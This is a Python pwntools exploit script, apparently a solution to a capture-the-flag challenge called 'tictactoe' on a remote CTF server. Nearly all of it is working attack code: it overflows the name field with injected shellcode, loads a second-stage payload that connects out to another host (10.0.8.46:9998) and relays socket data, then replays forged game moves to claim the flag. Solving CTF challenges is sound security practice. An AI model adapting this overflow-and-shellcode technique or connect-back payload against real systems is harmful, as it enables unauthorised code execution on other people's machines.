#!/usr/bin/python

from pwn import *

#bb = process("./tictactoe")
#p = remote("localhost", 8889)
p = remote("pwn-tictactoe.ctfz.one", 8889)

context(arch='amd64', os='linux')

send_get_flag = 0x40195f
name_addr = 0x405770
session_addr = 0x405740
ip_addr = 0x405728
target = name_addr+0x60

user_sock_fd = 4
serv_sock_fd = 3

# get ip
#sc = ""
#sc += shellcraft.linux.write(user_sock_fd, 0x7ffff7fcf4d0, 0x100)

# do dupsh
# sc = shellcraft.mov('rax', 4)
# sc += shellcraft.dupsh('rax')

# do connect
sc = ""
sc += shellcraft.mov('rbp', name_addr)
sc += shellcraft.linux.read(user_sock_fd, 'rbp', 0x400) # stager
sc = asm(sc)

log.info("sc length : " + str(len(sc)))
log.info("".join(['\\x{:02X}'.format(ord(i)) for i in sc]))

payload = sc
payload += "A"*(0x50-len(payload))
payload += p64(name_addr)*2
payload += "B"*(0x105-0x61)
name = payload
p.sendlineafter("name: ", name)

payload = "C"*len(sc)
sc = ""
sc += "add rbp, 0x600\n"
sc += "loop_start:\n"
sc += shellcraft.linux.connect("10.0.8.46", 9998)
sc += shellcraft.linux.dup('rbp')
sc += shellcraft.linux.read(user_sock_fd, 'rsp', 0x100)
sc += shellcraft.linux.write(0, 'rsp', 0x100)
sc += shellcraft.linux.read(0, 'rsp', 0x100)
sc += shellcraft.linux.write(user_sock_fd, 'rsp', 0x100)
sc += "jmp loop_start\n"
sc = asm(sc)

log.info("sc length : " + str(len(sc)))

payload += sc
payload += "D"*0x200
p.send(payload)

sleep(1)
# get session
p.sendline("1")
session = p.recvn(0x100)[4:36]
log.success("session : " + session)

# simulate game
for i in xrange(100):
  p.sendline("2"+session+p32(0)+p32(1))
  log.success(p.recvn(0x100))
  p.sendline("2"+session+p32(2)+p32(4))
  log.success(p.recvn(0x100))
  p.sendline("2"+session+p32(3)+p32(7))
  log.success(p.recvn(0x100))

p.sendline("3"+session)

p.interactive()

